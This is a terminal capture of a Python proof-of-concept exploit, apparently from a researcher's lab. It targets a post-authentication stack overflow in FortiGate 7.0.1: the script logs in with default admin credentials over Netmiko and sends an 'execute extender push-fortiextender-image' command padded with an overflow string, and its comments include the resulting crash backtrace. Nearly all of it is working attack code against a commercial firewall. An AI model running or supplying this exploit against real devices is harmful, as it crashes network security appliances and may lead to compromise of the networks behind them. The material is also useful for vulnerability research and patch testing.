
c@ubuntu:~/LABS$ cat fp17.py
#!/usr/bin/env python3
# fortigate 7.0.1 postauth stack overflow 0day
#
# more: 
#   https://code610.blogspot.com/2023/04/fuzzing-fortigate-7.html
# 
# Pid: 00243, application: newcli, 
# Firmware: FortiGate-VM64 v7.0.1,build0157b0157,210714 (GA) (Release), 
# Signal 6 received, Backtrace: 
# [0x7f498e5f16f0] [0x7f498e5f2d47] [0x7f498e633f47] [0x7f498e6c2c9e] 
# [0x7f498e6c2c62] [0x01f10f4d] [0x4343434342424242] 
#
# 

from netmiko import Netmiko

login = 'admin'
passwd = 'admin'
target = '192.168.56.222'

fw_01 = {
        'host' : target,
        'username' : login,
        'password' : passwd,
        'device_type' : 'fortinet'
}

print("> connecting to the target: %s" % target)
net_connect = Netmiko(**fw_01)
# print( net_connect.find_prompt() )

payload = 'execute extender push-fortiextender-image '
payload += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD' + 'F'*300 + ' asd'

command = payload

full_config_cmd = net_connect.send_command( command )
print(full_config_cmd)

print("done")

